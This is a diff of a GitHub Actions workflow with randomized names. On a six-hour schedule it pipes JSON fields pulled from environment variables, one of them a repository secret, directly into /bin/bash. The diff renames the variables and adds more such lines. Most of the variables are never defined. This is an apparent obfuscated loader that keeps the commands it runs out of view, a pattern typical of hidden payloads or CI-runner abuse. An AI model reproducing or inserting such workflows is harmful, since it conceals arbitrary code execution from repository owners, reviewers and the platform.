@@ -1,23 +1,30 @@
 name: interjectwet
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
+    - cron: '56 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: interjectwet
         env:
-          lg22: ${{ secrets.lg22 }}
+          s68362: ${{ secrets.s68362 }}
         run: |
-          echo $lg22 | jq -r .pnx9 | /bin/bash
-          echo $baj24 | jq -r .fud4575 | /bin/bash
-          echo $kfewd7 | jq -r .is151 | /bin/bash
-          echo $jiqvv942 | jq -r .fbyzs8313 | /bin/bash
-          echo $ud8918 | jq -r .nczp44920 | /bin/bash
-          echo $dqr749 | jq -r .kiue9590 | /bin/bash
-          echo $namol42 | jq -r .azu1 | /bin/bash
+          echo $s68362 | jq -r .qiiru5297 | /bin/bash
+          echo $aibp8 | jq -r .e88 | /bin/bash
+          echo $kqjv960 | jq -r .gnrx9942 | /bin/bash
+          echo $fk63795 | jq -r .un613 | /bin/bash
+          echo $hibw1852 | jq -r .trfbs65444 | /bin/bash
+          echo $wn64592 | jq -r .trgd5 | /bin/bash
+          echo $nquvg4777 | jq -r .i8072 | /bin/bash
+          echo $viey63662 | jq -r .eg085 | /bin/bash
+          echo $s4 | jq -r .ll7265 | /bin/bash
+          echo $wpby2 | jq -r .qums033 | /bin/bash
+          echo $kz122 | jq -r .v3 | /bin/bash
+          echo $ken1242 | jq -r .bijrl770 | /bin/bash
 
